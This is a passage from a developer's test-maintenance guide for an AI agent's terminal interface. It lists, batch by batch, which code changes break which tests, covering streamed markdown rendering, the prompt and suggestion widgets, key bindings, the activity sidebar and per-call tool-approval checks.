| Teaching `_command_touches_protected` to split tokens on more than the first `=` | No test fails immediately — that is the point of G2. The generative totality corpus (`TestTheGateAnswersForEveryString`) is the nearest guard: `\;` and non-string commands go through the gate, and a helper that parses more syntax eventually raises inside it (Q3's original bug, one layer down) | Keep the check to raw tokens, the one `=` split, and the realpath — the same vocabulary `_escapes_workspace` permits itself |
| Monkeypatching one of `file_ops.WORKSPACE_ROOT` / `config.WORKSPACE_DIR` without the other in a new test | The `workspace` fixture sets BOTH (`WORKSPACE_ROOT` is captured at import and cannot follow a rebind — the reason sandbox's `_within` re-derives its own root); the shell tests set `config.WORKSPACE_DIR` because `classify_command` takes the directory as an argument. A half-patch makes the guard and the handler answer different workspaces | Use the fixtures; do not re-derive the pair |

Count 3483 -> 3510.

---

## The turn label opens above a tool call — `test_live_output.py` / `test_themes.py`

§43 RM1, amended: `_render_entry`'s `tool` branch now calls `_open_label()`, and the research
pipeline's tool lines carry their own role (`pipeline_tool`) so the amendment cannot reach
them. The opener set and the `/copy` classification are orthogonal concerns: `pipeline_tool`
is CONVERSATION (batch 48's copy shape is unchanged) and NOT an opener (the run's label
belongs to the report). `tool_error` and `diff` stay exempt — pinned, not forgotten.

### What breaks it

| Change | Symptom | Fix |
|---|---|---|
| Removing `_open_label()` from `_render_entry`'s `tool` branch | Every test in `TestTheToolLineOpensTheTurn` fails: a turn whose first output is a tool call (the normal MCP shape) draws the call under `you ›` and the label above the prose that followed | Restore the call. The guard inside `_open_label` keeps the mid-turn half of §43 true — `test_a_tool_line_does_not_re_open_a_label` still passes with the branch present |
| "Fixing" the mid-turn shape by clearing `_label_in_force` at a tool line | `test_one_label_across_tool_batches` and the §43 tests fail: the label re-opens after every batch — the exact defect §43 retired | One label per TURN. A tool line inside the turn is part of what the label already announced |
| Reverting the research `write_role` in `on_pipeline_event_message` from `pipeline_tool` to `tool` | `test_a_pipeline_tool_line_never_opens_the_label` fails: a research run's label moves from the report to the run's first tool call — a rendering change nobody decided | Keep the role split. The run is the harness working; the report is the model answering |
| Rendering `pipeline_tool` through the `else` branch (deleting the dedicated branch) | `test_a_pipeline_tool_line_renders_with_the_tool_style` fails: `_style("pipeline_tool")` has no palette entry, so the line goes out UNSTYLED — and nothing else notices, because the text is identical either way | Keep the alias branch (`self._style("tool")`). Adding `pipeline_tool` to `role_styles` instead would put an identical style string beside `tool` in MESSAGE_ROLES and fail the pairwise-distinctness pin in `test_themes.py` |
| Classifying `pipeline_tool` as META "for consistency" | `/copy conversation` for a research run loses the tool lines — batch 48 documented the copy as "the query, the tool lines and the report" | `pipeline_tool` is CONVERSATION. The label opener and the copy filter are different questions; do not merge them |
| Adding `pipeline_tool` to `MESSAGE_ROLES` | `test_the_message_roles_are_pairwise_distinct` fails wherever `tool` and `pipeline_tool` share the aliased style | It lives in `ENTRY_ROLES` beside `assistant` and `diff` — reachable, classified, and skipped by the colour checks |

Count 3510 -> 3517.

## Batch 53 — the transcript renders a table

`tui/markdown.py` is new and owns the grammar; `tui/widgets.py` owns the painting. The rule
worth carrying out of this batch is that **the cap and the cell measurement are one design**:
either alone is wrong, and each is invisible to the tests that cover the other.

### What breaks it

| Change | Symptom | Fix |
|---|---|---|
| Committing a chunk without `markdown.safe_commit_limit` | `TestATableIsHeldAndDrawnWhole` fails: table rows reach the screen as their own pipes and the grid can never be drawn, because `RichLog` appends and cannot rewrite a drawn row | Keep the cap. It is §38's open-fence hold generalised — the reason was never about fences, it is about anything committed in halves |
| Turning the cap back into a rejection (`if construct_open: return`) | Nothing fails, and that is the point: the prose ABOVE a table or fence stops streaming and waits for the construct to close. §38 shipped this way; the cap is the improvement | A cap is one number, so the paragraph before the construct still commits. Only the construct itself is held |
| Assigning `open_at = start` instead of `_hold(open_at, start)` | Two consecutive pipe lines: the second reports its own offset, so the first commits as prose and the delimiter arriving next has nothing to attach to. `test_a_partial_delimiter_under_it_keeps_holding` fails | Take the MINIMUM. A construct opening later cannot license drawing through one still open before it |
| Moving the table-termination check below the `FENCE` branch | A fence opener is a non-row line, so it ends a table — but the fence branch returns first, the table's hold is never cleared, and the fence reports a LATER offset than the table it swallowed | Settle `in_table` first. The order is the fix; a comment says so at the branch |
| Clearing the cap on a closing fence whose line has no newline yet | §38's `test_a_prefix_that_would_reopen_the_fence_is_held` fails: the last newline is INSIDE the block, so the committable prefix draws an unterminated opener | The fence is closed for the scan; the CAP stays where the opener put it until that line ends |
| `_split_committable` measuring source characters when `marks=True` | `TestAStreamedAnswerRendersLikeAWrittenOne` fails on the inline-mark cases: `**bold**` draws four cells narrower than it is written, so the cut lands where Rich would not have wrapped and a `/theme` reflows the transcript it was only meant to recolour | Measure rendered cells. This is the fourth divergence that test has caught; its docstring lists the first three |
| Defaulting `marks=True` | `thinking_delta` starts measuring reasoning as if its marks were rendered, which they are not — a bar-prefixed span is prose, `**` included | Off by default. The two callers want different answers and the parameter is how they say so |
| Dropping the "unclosed mark" clause from the cap | Rendered-cell measurement becomes undefined: a `**` that has not closed yet has no known drawn width, so the cut is taken against a guess | The cap is what makes the measurement well-defined. They are one design, not two features |
| Passing table cells as `str` instead of `Text` | Measured against the pinned Rich: `[bold]x` renders as `x` — swallowed, nothing raised — and `a[/]b` raises `MarkupError`, which is batch 42's RA1 arriving mid-answer instead of in a modal. `test_a_cell_that_looks_like_console_markup_survives_verbatim` fails | Every cell is a `Text`, header cells included. `[1, 2]` survives, so the rule is about the TYPE — the shapes that fail are not the ones a reader expects to be dangerous |
| Making a block kind something other than a tuple | The newline trimming in `_render_blocks` silently skips it, and a replay grows a blank row per table — invisible to anything reading `_entries` | `CodeBlock` and `TableBlock` are tuple subclasses so `isinstance(block, tuple)` keeps meaning "occupies its own rows" for both at once |
| Relaxing table detection (dropping the delimiter-row requirement) | Not a rendering defect — a STALL. A shell pipeline or a `\|` in prose becomes a table, and the cap holds the stream waiting for a terminator that never arrives | GFM-strict. Most of `test_markdown_render.py` is the tables that are NOT there, for this reason |
| Storing the rendered grid in `_entries` | `/copy` hands back box-drawing characters instead of the pipes the model wrote, and a `/theme` replays a table decorated once instead of re-deriving it | `_entries` holds the source. Same rule as the thinking bar (§38) and the diff block (§41) |
| Adding the five new palette roles to `MESSAGE_ROLES` | `test_the_message_roles_are_pairwise_distinct` fails (`md_heading` and `table_header` share a string on purpose), and `test_dim_is_the_system_role_alone` starts asking about a role with no hue | They are marks INSIDE an entry, not kinds of line — the `diff_*` precedent. `EXPECTED_ROLE_KEYS` is where they belong |
| Reaching for `rich.markdown.Markdown` to "finish the job" | It re-flows text itself, which is what the cell measurement exists to keep under our control, and it takes over the fence handling §26 and §38 pinned | Deferred deliberately. `tui/markdown.py`'s block splitter and `inline_spans` are the seam a later batch extends |

### Standing: a new construct needs a clause in the cap

A construct added to `split_blocks` and not to `safe_commit_limit` renders correctly on
replay and split on the wire — green in every test that reads `_entries`, wrong on screen,
and only `TestAStreamedAnswerRendersLikeAWrittenOne` can see it. Add the case there when you
add the construct.

Count 3517 -> 3595.


---

## Batch 54 — the prompt box that grows

`tui/widgets.py`'s `PromptInput` is a `TextArea` subclass wearing an `Input`'s clothes. Two
of those clothes are load-bearing for this suite specifically, and one of them is why this
batch edited no existing test.

**`value` is the seam.** Roughly sixty call sites across `test_tui.py`,
`test_research_legibility.py`, `test_pipeline_models.py`, `test_themes.py` and
`test_diff_view.py` say `app.query_one("#prompt").value = "…"` and then
`await pilot.press("enter")`. A `TextArea` calls that attribute `text`. The property alias
is the only reason those sites still work, and it is the kind of one-line adapter this file
exists to protect: nothing about it looks necessary from the widget's side.

| Change | Symptom | Fix |
|---|---|---|
| Deleting the `value` property from `PromptInput` | ~60 tests across five files fail at once with `AttributeError: 'PromptInput' object has no attribute 'value'`, on `#prompt` rather than on anything the tests are about — an afternoon of chasing a rendering change through files that test permissions, themes and diffs | Keep the alias. Renaming sixty sites to `.text` is a bigger edit than the batch it would serve, and every one of those files is about something else |
| Dropping `priority=True` from the `enter` binding | `test_enter_submits_rather_than_inserting`, `test_a_multi_line_prompt_reaches_the_turn_intact` and `test_it_collapses_when_the_turn_is_sent` fail. `TextArea._on_key` maps `enter` to a newline insert and calls `event.stop()` / `event.prevent_default()`, which beats an ordinary binding — so Enter inserts a line break and no turn ever starts | Keep the flag. It reads like caution and is the opposite; measured both ways against the pinned textual 1.0.0 (D22) |
| Turning `soft_wrap` off | `test_a_long_line_wraps_with_no_newline_in_it` fails on `max_scroll_x` — and would NOT have failed on the row count, which is the trap below | Keep it on. Wrapping is the feature; `ctrl+j` is for a break the user wants |
| Removing `height: auto` / `max-height: 6` from `#prompt` | Six cases in `TestThePromptBoxGrowsWithWhatIsTyped` fail: `TextArea`'s own `DEFAULT_CSS` is `height: 1fr`, so the box fills the column and the transcript is squeezed to nothing | The pair is the growth. `auto` alone is unbounded; `max-height` alone reserves its cap whether or not anything is typed |
| Widening `max-height` past 6 | `test_it_stops_at_four_rows_and_scrolls` and `test_a_full_prompt_leaves_the_transcript_drawing_at_80x24` fail | 6 is the border plus four text rows, chosen against the 24-row floor |
| Letting the app handle `Input.Submitted` again (renaming the handler back) | `test_enter_in_the_review_note_does_not_reach_the_prompt_handler` fails, and the traceback shows the whole original bug: `/help` dispatched from ReviewScreen's note box, then `_cmd_help` raising `NoMatches` on `#transcript` because a modal was on top | `PromptInput.Submitted` is its own type. `Input.Submitted` bubbles past a modal's handler to the app's — measured, both run |

### The trap: "it got taller" is not "it wrapped"

A `TextArea` with `soft_wrap` off grows a **horizontal scrollbar**, which is a row. Measured
on a 54-column box: wrapped, a 186-character line is 4 rows at `max_scroll_x == 0`;
unwrapped it is **2 rows** at `max_scroll_x == 133` — one text row and one bar. So an
assertion that the box grew past one row passes with wrapping switched off, while the
sentence is still 133 columns off to the right, which is the entire defect the batch exists
to remove. The first draft of `test_a_long_line_wraps_with_no_newline_in_it` asserted
exactly that and survived the mutation.

`max_scroll_x == 0` is the assertion that separates them. The row count is pinned EXACTLY
and sized to land BELOW the cap, so "wrapped" also cannot be confused with "hit
`max-height`" — a test that cannot tell those apart is testing the stylesheet.

### Standing: `shift+enter` is deliberately untested

A pilot can synthesise the key, so a test would pass everywhere and pin Textual's dispatch
rather than the thing in doubt — whether a terminal ever sends it. **That reasoning has
never changed.** The FACT under it has, twice, and batch 81 was the batch that went and
looked.

It was "textual enables the kitty keyboard protocol in its Linux drivers alone", which
**6.6.0 retired** by adding it to the Windows driver. What replaced it is the TERMINAL:
textual's Windows driver reads console records and keeps only the translated character,
discarding the modifier state, so the escape encoding is the only route a modified Enter
has — and a terminal that does not implement the protocol still sends a bare CR that
reads as `enter` and submits. Windows Terminal shipped support in Preview 1.25; this
project is developed on 1.24, so the press has never been observed here.

So `ctrl+j` is still what the feature rests on and still what is pinned. Do not "fix the
coverage gap" by adding the shift+enter case. `TestShiftEnterIsStillNotTheKey` pins the
three DEPENDENCY facts instead — the parser's encoding, the alt+enter dead end, and the
Windows driver's enable — which is what stops the paragraph above going stale unnoticed
for another twenty months, as its predecessor did.

**What would end this:** a terminal here that implements the protocol. The by-hand press
comes first and the docs after, in that order.


## Batch 55 — the slash-command suggestion panel

**`PromptInput.load_text` is a seam, and it is holding up ~73 test sites that never mention
suggestions.** Setting `prompt.value` posts `TextArea.Changed` exactly as typing does. The
panel is driven off that message, and `enter` COMPLETES while the panel is open — so if
assignment were allowed to open it, every

```python
app.query_one("#prompt").value = "/help"
await pilot.press("enter")
```

in `test_tui.py`, `test_themes.py`, `test_pipeline_models.py` and
`test_research_legibility.py` would fill the box in again instead of dispatching. Every bare
assignment in the suite is an exact command name, so all of them would fail, and none of them
would fail in a way that named the cause.

```python
def load_text(self, text: str) -> None:
    self._api_edit = True          # <- this line
    super().load_text(text)
```

Delete those two lines and `test_assigning_the_value_does_not_open_it` goes red first — it
exists to be the failure you read instead of the four files you would otherwise bisect.
`_replace_via_keyboard` is the seam textual advertises for this ("as opposed to the API") and
is the wrong one here: backspace does not go through it, so a panel hung off it would ignore
deletions.

| Change | Symptom if you break it | Fix |
|---|---|---|
| `load_text` marks the API edit | dozens of unrelated slash-command tests re-type instead of dispatching | restore the override |
| `matching()` `lstrip`s and rejects any space | `/copy ` keeps the panel open; enter completes over itself and never sends | keep it `lstrip`, not `strip` |
| the wrap width subtracts `SUGGEST_CONT` | a two-line entry draws three rows; heights drift by one per entry | both gutters go INSIDE the wrap width |
| the ellipsis is appended after a crop | a cut entry reads as complete | `truncate()` alone cannot do it — see below |
| the budget counts ROWS | five two-line entries at the 24-row floor leave the transcript five lines | keep `used + len(lines) > SUGGEST_MAX_ROWS` |
| `check_action` returns `None` | tab stops moving focus when there is nothing to complete | `None` declines, `False` disables |
| app.py re-pins the transcript | the newest twelve lines vanish the moment a slash is typed | capture `pinned` BEFORE the relayout |

### The trap: a pilot test can be blind to the thing it was written for

`test_no_rendered_row_is_wider_than_the_panel` drives the real app, types `/`, and checks
every drawn row against the panel width. It **survived** the mutation that wraps at
`width - 2` instead of `width - 4` — the exact defect it was written for. At 80 columns only
`/research` has a continuation line long enough to overflow, and a bare slash shows four
entries that do not include it.

`test_no_command_renders_a_row_wider_than_the_panel` is what kills it: no pilot, every
registered command, four widths. If you add a command whose flags are long, that sweep already
covers it. Do not replace the sweep with the pilot case because "the pilot one is more
realistic" — realism is what made it blind.

### Standing: `Text.truncate()` cannot produce the ellipsis

It looks like it can — `truncate(n, overflow="ellipsis")` is right there. It is a no-op on a
wrapped line, because the overflow is in the lines that were DROPPED and the line that was
kept is shorter than the width. Crop, then append. A test asserting `endswith("…")` is what
holds it.


## Batch 56 — the suggestion window slides

**`panel.visible`, never `panel._matches[:panel.shown]`.** The second spelling was correct for
exactly one batch, because the window always started at zero. It no longer does, and it fails
*silently* in the direction that matters: on an unscrolled list the two agree, so a test written
the old way passes at the top and lies everywhere else. `test_the_row_budget_drops_the_entry_
that_would_not_fit` was rewritten to use `visible` for this reason and not because it was
failing.

**`_selected` is an index into the MATCHES, not into the window.** `_first` is where the window
starts, and it is derived on every measurement rather than stored beside the selection. If you
find yourself wanting to set `_first` from outside `_budget`, that is the signal that the two
have been allowed to disagree.

| Change | Symptom if you break it | Fix |
|---|---|---|
| `move()` wraps over `len(self._matches)` | the list cycles at the fourth entry and twenty-two commands are unreachable | wrap over the matches, not `_groups` |
| `move()` uses `refresh(layout=True)` | an entry is missing with no error — the widget stays measured at its old height and the extra row is clipped | `layout=True` is required once a window can resize |
| the arrows post `SuggestionsMoved` | the conversation creeps upward as you scroll the list | the move must run inside `app.py`'s pin |
| `first = min(self._first, self._selected)` | drop the `min` and arrowing up strands you at the bottom; use `0` and the list jitters for a selection it was already showing | keep both halves |
| `render()` highlights `_selected - _first` | the wrong row lights up once the list scrolls, while `chosen` keeps returning the right command | subtract the window start |

### The trap: a test that agrees with the bug at position zero

Everything about this window is correct while `_first == 0`, which is where every test starts
and where a hand-check naturally looks. `test_the_window_stays_inside_its_budget_at_every_
position` is the answer — a bare widget, no pilot, the selection walked through all twenty-six
at four widths, carrying `_first` between steps so the MINIMAL-scroll property is pinned too
(a window that jumped further than it needed to would satisfy every other clause). It is the
same instrument batch 55 had to add after a pilot test survived its own mutation; here it was
written first.

### Standing: `test_the_transcript_stays_pinned_while_the_window_scrolls` asserts it saw a resize

The last line of that test is `assert len(heights) > 1`. It is not decoration: the pin only has
anything to prove on a keypress that changes the panel's height, and if the entry line-counts
ever shift so that scrolling no longer resizes, the test would keep passing while testing
nothing. Do not delete it as a redundant assertion — it is what keeps the other one honest.


## Batch 57 — the quit gesture, and aliases that are not commands

**`check_action` returns `False` for the inactive ctrl+c binding, and `None` breaks it
invisibly.** `Screen.active_bindings` skips a binding only on `is False`; `None` leaves it in
the map marked disabled, and the map is keyed by KEY, so the first-listed binding keeps the slot
either way. The DISPATCH is unaffected — `_check_bindings` walks past a refused action to the
next binding for the same key — so every behavioural test still passes while the footer shows
one label forever. `test_the_footer_says_what_a_second_press_will_do` asserts on the drawn
`FooterKey` row for exactly this reason; reading `app.active_bindings["ctrl+c"].binding` would
agree with the bug.

**`priority=True` on both ctrl+c bindings is what makes the key work at all**, and
`_copy_selection()` is what keeps it usable. `Input` and `TextArea` bind ctrl+c to `copy` and a
non-priority app binding loses to the focused widget; `ModalScreen` blocks non-priority app
bindings outright. The flag reaches past both — and pre-empts the widget's copy completely
(measured: the clipboard stayed empty), which is why the app copies the focused widget's
selection itself. Remove that branch and ctrl+c stops copying anywhere in the app.

**Aliases are not commands, and three lists say so.** `all()`, `names()` and `matching("/")`
are canonical. If you are reaching for `_aliases` to make something appear in a listing, check
first whether the listing is a MENU — a bare slash is, and it names each thing once.

| Change | Symptom if you break it | Fix |
|---|---|---|
| `check_action` returns `False`, not `None` | the footer label never changes, while every keypress does the right thing | `False` is "disabled and hidden"; `None` is "disabled and still in the map" |
| `arm_quit` calls `refresh_bindings()` | armed state moves, footer does not | the `Footer` recomposes off the screen's bindings signal and nothing else raises it |
| a press over a selection copies and returns | ctrl+c stops copying, or copying quits the app | the branch is first in BOTH actions |
| `_disarm_quit` is scheduled | the arm never expires, so a ctrl+c now and another one an hour later quits | `set_timer(QUIT_CONFIRM_S, ...)` |
| an alias row carries the ALIAS as its `name` | enter over `/exit` fills in `/quit`, silently correcting what was typed | `_alias_row` builds a `SlashCommand` named for the alias |
| `matching()` returns early on an empty prefix | a bare slash lists 28 things, and every window position batch 56 measured moves | aliases join the sort only once a prefix is typed |

### The trap: a mutation that is right about everything except the screen

The `None`-for-`False` mutation is the shape worth remembering, because it is the third distinct
false-green this TUI work has produced and the first that is *invisible to behaviour*: batch 49's
was a case table with nothing in range, batch 54's an assertion that could not tell two states
apart, batch 55's a test whose inputs never reached the state. This one is a bug that changes
only what is DRAWN, in a widget nobody thinks to query, while the keys keep working perfectly.

### Standing: `test_no_slash_command_touches_the_posture` now reads aliases too

`names()` is canonical by design, and an alias reaches `dispatch` exactly as a name does. A
guard over `names()` alone would wave `/unsafe` through as an alias of something
harmless-looking. The positive half (`assert "exit" in names`) is there for the usual reason: if
aliases ever stop reaching that set, the negative assertion would be checking nothing.


## Batch 58 — lists, links, and the flag that says where a chunk sits

**`line_start=False` is not a nicety; it is the fix for a shipped bug.** `_render_blocks` and
`_inline_text` take it, and it means *this chunk begins in the middle of a line*. Remove it and
a streamed fragment whose wrap boundary falls immediately before a `# ` token renders as a
heading and **swallows the hash** — reproduced at a prefix of exactly 77 characters, invisible
to any assertion that reads `_entries`, and put back by a `/theme` replay. It is derived from
`self._stream_text.endswith("\n")` rather than remembered, which is why it costs no state.

**A list item is held by the cap, like a fence and a table.** Its wrapped rows are padded to
the marker's own text column, so a fragment committed without its marker can never be indented
afterwards. If you find yourself removing that hold to make streaming smoother, the thing you
will break is `TestAStreamedAnswerRendersLikeAWrittenOne`, not the appearance of a bullet.

**`HOLD_LIMIT` is enforced in TWO places and only works as a pair.** `commit_span` gives up on
a line-scoped hold past the limit; `list_item()`, `heading()` and the mark scan refuse the same
line at the same limit. Enforce it in the cap alone and the released chunk renders as a list
item while the replay renders it as prose. Enforce it in the grammar alone and the stall comes
back.

**A fence and a table are exempt from the ceiling, deliberately.** Both must be drawn whole to
be drawn correctly. Their bound is `flush_stream`.

**`safe_commit_limit` is now `commit_span(...)[0]`.** One scan, two answers. A second function
reading the buffer separately is the shape this module's own docstring warns about.

**Aliases for the indent rule: `verbatim()` is asked in three places and nowhere else.**
`_scan` (so every inline caller inherits it), `_is_row` (so `_read_table` and the cap agree
about where a table stops) and `list_item`. `_HEADING` never needed it — it is anchored at
column 0. **Fences are exempt** and that is TECHNICAL_DEBT.md entry 14.

**The URL span's TEXT is the target.** That is the security rule as a data shape, not an
implementation convenience: there is no separate destination field, so there is nowhere for one
to differ from what the reader sees. If you add a `[label](url)` construct that renders the
label, you have removed the only thing standing between a rogue model and an arbitrary
destination behind a friendly name.

| Change | Symptom if you break it | Fix |
|---|---|---|
| `line_start` reaches `_inline_text` | a mid-paragraph `# ` renders as a heading, eating the hash | derived from `_stream_text`, passed through `_write_stream_chunk` |
| `forced` reaches the renderer as `line_start=False` | a bullet past 1000 characters streams indented and replays flat | `commit_span`'s second value |
| the limit is refused by the grammar too | the same divergence, from the other side | `list_item`/`heading` return None past `HOLD_LIMIT` |
| the item body wraps at `width - indent` | the continuation row is one column too wide and Rich re-wraps it to column 0 | the indent is the content column, used for both the wrap and the padding |
| `clickable` is re-asked in `open_url` | a style outliving its text opens something the reader never saw | check at the point of ACTION, not at render |
| the URL is metadata, not an `@click` action | a URL containing a quote injects into a parsed action string | a plain key we read in `on_click` |
| ctrl is required | reading the transcript launches a browser | `event.ctrl` |
| `.isascii()` on a URL | a homograph URL is armed, and "visible equals target" is a lie | ASCII-only arming; it still renders |
| `_em_edge`'s space rule | `a * b` opens a mark that never closes and the cap holds the paragraph | an opener needs a non-space after it |
| `_em_edge`'s wedge rule | `2*3*4` and `x*y*z` italicise, as full GFM does | refuse an asterisk between two word characters |

### The trap: a bug that only the drawn row can see

Batch 57's was a mutation right about everything except the footer. This one is the same class
one layer down and it was **already shipped**: the `#`-eating fragment passes every assertion
about `_entries`, every assertion about `safe_commit_limit`, and every test that renders the
answer whole. It is visible only in the equality between a streamed answer and a written one —
which is why that test is parametrised over shapes rather than written once, and why the new
case is pinned at the prefix length that reproduces it rather than at a shape that might.


## Batch 59 — the agent activity channel and the scrolling sidebar

### Dropping `activity` from a `registry.dispatch()` call site

**Symptom:** nothing fails. The suite stays green and the sidebar's agent panel simply never
shows a spawn from that path.

**Why nothing catches it:** `activity=None` is a fully supported value on every signature — it
is what the CLI and the pipeline pass — so a dropped argument is indistinguishable from a shell
that is not watching. `tests/test_agent_activity.py::TestSpawnSubagentReportsItself` covers the
`spawn_subagent` route specifically; the `dispatch` site in `core/loop.py` (there were two when
this was written -- batch 60 merged them) is pinned by `test_loop_tool_dispatch.py`'s
`assert_called_once_with`, which names `activity=None` explicitly. **That assertion is the only
thing standing between a dropped kwarg and silence.** If you widen `dispatch()` again, add the
name there too -- in `test_loop_tool_dispatch.py` (three sites) and `test_e2e.py` (one), all of
which spell the call out in full.

### Dropping `activity=activity` from `subagent_tool.run()`'s inner call

**Symptom:** depth-1 spawns still draw; depth 2 disappears.

**Fix:** `tests/test_agent_activity.py::test_the_sink_is_passed_DOWN_so_the_grandchild_can_report`
fails. It asserts on the kwarg the child run receives rather than on a rendered row, because a
depth-2 row needs two nested runs to observe and the argument is the actual contract.

### Replacing `agent_activity.span()`'s context manager with an enter/exit pair

**Symptom:** the panel is correct until a subagent raises, then keeps a row forever.

**Fix:** three tests go red — `test_a_raising_run_still_exits`,
`test_a_spawn_that_raises_still_closes_its_span`, and
`test_a_sink_that_raises_does_not_take_down_the_run`. Do not "simplify" the `finally`; it is the
reason the module exists as more than a dataclass.

### Adding a name to `_INJECTABLE_PARAMS` and forgetting `dispatch()`'s `available` map

**Symptom:** `KeyError` at the first dispatch of any tool declaring it.

That is deliberate (the map's own comment): an explicit map fails loudly where a ternary
mis-injected silently. Both places, always.

### Six `fake_dispatch` stubs now take `**_run_scoped`

They enumerated every kwarg, so each new injectable name broke them all at once — which is the
coupling `tools/registry.py`'s comment says `dispatch()` should not have. If you write a new
dispatch stub, take `**_run_scoped` rather than spelling the list.

### `app._activity` on a bare-built `VenastineApp`

**Symptom:** `AttributeError: '_Bare' object has no attribute '_activity'` from
`run_agent_turn` or `run_one_shot`.

Tests in `test_skills.py` and `test_catalog_advertisement.py` build an app with
`_Bare.__new__(_Bare)` and set the attributes the path needs. A new attribute read by a run site
belongs in those stubs. The stub apps in `memories/tui_commands.py`'s tests are handled the
other way — those call sites use `getattr(app, "_activity", None)`, because a `/summary` must
not depend on a sidebar widget existing.

### Restoring `max-height` on `#todo-panel` or `#research-progress`

**Symptom:** rows vanish with no scrollbar anywhere able to reach them.

**Fix:** `test_tui.py::TestTheSidebarScrolls::test_no_sidebar_panel_caps_itself_into_a_silent_clip`
fails. A `Static` never reports content taller than its own box, so a `max-height` on one is a
CLIP, not a bound — EP3, twice. Asserted through the style rather than by drawing, because the
symptom is invisible: the rows do not overflow, they cease to exist.

### Removing `overflow-y: auto` from `#sidebar`

**Symptom:** on a 24-row terminal with a checklist and a research run up, the research panel is
drawn entirely off screen.

**Fix:** `test_what_does_not_fit_can_be_scrolled_to` fails. Note its sibling
`test_a_full_sidebar_overflows_the_24_row_floor` is a PREMISE guard — it passes either way, and
exists so the fixture cannot quietly stop overflowing.

### A second `registry.dispatch()` call site in `_run()`

**Symptom:** an approval the user already gave is refused with "requires approval and was not
given" and no prompt — the second spawn of one agent in a turn, a subagent using a tool it was
ticked for, a `--grant-tools` name in an unattended run.

**Fix:** `test_grants.py::test_the_loops_authorization_cannot_outlive_one_tool_call` fails on
the call-site count, and `TestAnAnsweredCallActuallyRuns` fails on the outcome. This is the same
defect returning: two sites that must agree about authorization, where the one an answered call reaches
is the one that forgets to say so. Keep it at one.

### Dropping `signoff=` from that dispatch call

**Symptom:** nothing visible. The second child of one sign-off runs with NOTHING granted while
the first got the ticked set, so it re-prompts for tools the user already authorised.

**Fix:** `test_the_second_spawn_is_handed_the_remembered_signoff` fails. It spies on `dispatch`
with `wraps=` rather than replacing it, because the claim is about the arguments AND the gate
has to stay live.

### Turning `authorized_call` back into a boolean

**Symptom:** none, today — and that is the entire point. Hoisting a bool out of `for call in
response.tool_calls:` would let one approval cover every later call in the turn, and it survives
every behavioural test, because the three other reasons `needs_approval` is turned off are each
short-circuited inside `dispatch()` before its gate.

**Fix:** `test_the_loops_authorization_cannot_outlive_one_tool_call` fails — it reads the source,
which is the only place the difference is visible. The ID also makes the mistake fail CLOSED: a
hoisted variable holds the previous call's id, so the comparison fails and the call is denied.

### Making `approval_callback` unconditional at that call site

**Symptom:** none today, for the same reason as above — and a silent "approve everything" the
moment a fourth reason to skip the prompt is added.

**Fix:** the same structural test fails on `isinstance(callback, ast.IfExp)`. NOTE for anyone
mutation-testing this line: replacing only the inner expression leaves `approval_callback=(`
unbalanced, and a collection error scores as a kill while measuring nothing. Mutate the whole
keyword argument.

### A gated tool test that does not raise `ToolPermissions`

**Symptom:** a non-widening test passes without ever reaching the approval gate.

**Fix:** nothing fails, which is why this is written down. `shell` and `write` are disabled in
the shipped config, so `is_tool_allowed()` refuses them first and the result is
`"... is disabled by policy"` rather than an approval outcome. `test_grants._raise_policy` exists
for this; the first draft of `TestAnAnswerCoversOneCallOnly` was green against a gate it never
touched.


### `tui/app.py` imports `time` instead of `from time import monotonic`

**Symptom:** `tests/test_tui.py` HANGS rather than failing — the run never returns and has to
be killed.

**Fix:** restore `from time import monotonic`. `mocker.patch("tui.app.time.monotonic", ...)`
resolves `tui.app.time` to the global `time` module, so a frozen clock in one test freezes it
for textual's event loop and for `conftest.settle`'s timeout too. The module-local name is a
patch point that reaches nothing else. Batch 61.

### `_busy_state` assigned anywhere but the property setter

**Symptom:** `test_the_busy_flag_is_the_only_way_to_move_the_clock` fails with a site count.

**Fix:** route it through `_busy`. `_busy` is written at eleven sites with four distinct turn
exits, and the property setter is the only thing that starts and stops the turn clock — a new
exit assigning the backing field directly leaves the clock running forever, and no behavioural
test can see it. Batch 61, and batch 60's shape one layer up.

### `set_blocked` marshalled through `call_from_thread`

**Symptom:** `test_quitting_during_an_attended_research_prompt_releases_the_worker` fails with
"exit() left the worker blocked on approval".

**Fix:** call it directly. `_blocking_modal` runs on a worker thread, and a quitting app has no
message pump left to marshal into, so the worker parks forever. The meter touches no widget;
`set_blocked` is idempotent, which is what makes the direct call correct under the race with
the tick's own screen-stack read. Batch 61.

### `TurnMeter.stop` returning `0.0` instead of `None` for an idle meter

**Symptom:** `test_nothing_is_said_when_no_turn_was_running` fails; a `took 0.0s` line appears
under "Could not start the turn".

**Fix:** keep the `None`. `_busy` is cleared on paths where no turn ever ran — a starter's
early-return error branch — and the caller has to tell "nothing was running" from "it was
instant". Batch 61.

### A new test file with no entry in ARCHITECTURE.md's tree

**Symptom:** `test_the_tree_states_a_correct_count_for_every_collected_test_file` fails with
`no entry in the tree`, and `test_the_documented_count_is_the_real_one` fails on the aggregate.

**Fix:** add the entry with its count, update the file's own count if it grew, and bump the
total in README.md, AGENTS.md and ARCHITECTURE.md together. Both checks skip on a filtered
invocation, so a targeted run is green and the full suite is not.


### `#slash-suggest` with no `border-subtitle-color`

**Symptom:** `test_the_hint_and_the_count_are_the_same_weight` fails with two different
colours.

**Fix:** restore the rule in `app.tcss`. A border SUBTITLE with no rule renders in `$primary` —
the border's own colour — while the title beside it is `$text-muted`, so the key hint becomes
the loudest thing on a box whose own count is deliberately quiet. Measured, not assumed.
Batch 62.

### The suggestion panel's border labels assigned unguarded

**Symptom:** `test_measuring_twice_does_not_ask_for_a_third_paint` fails with a paint count.

**Fix:** keep the `if self.border_title != title:` / `if self.border_subtitle != hint:`
guards. `_BorderTitle.__set__` calls `refresh()` and `_budget` runs from `render()`, so an
unguarded assignment schedules a paint from inside a paint on every paint. It converges only
because the second measurement compares equal. Batch 62.

### `check_action` returning `False` for `tab` / `escape` to reach the footer

**Symptom:** tab stops moving focus once the suggestion panel is shut; `escape` reaches
nobody.

**Fix:** it must stay `None`. `Screen.active_bindings` skips a binding only on `is False`, so
`False` is what a footer entry needs — and it is also what DISABLES the key everywhere else.
Batch 55 chose `None` so both keys keep their life outside the panel; batch 57 needed `False`
for the opposite reason on a key that has none. The hint lives on the panel's own border
because of this, not by preference.

### A width sweep taken at round numbers instead of at the drop boundaries

**Symptom:** nothing fails — `test_the_hint_never_overflows_the_border` passes over a budget
that is wrong by two.

**Fix:** sweep 44/43, 34/33 and 13/12, the widths at which a hint part drops. At 80, 54, 44,
38, 30 and 20 a two-cell error in the budget changes no output at all, so the mutation that
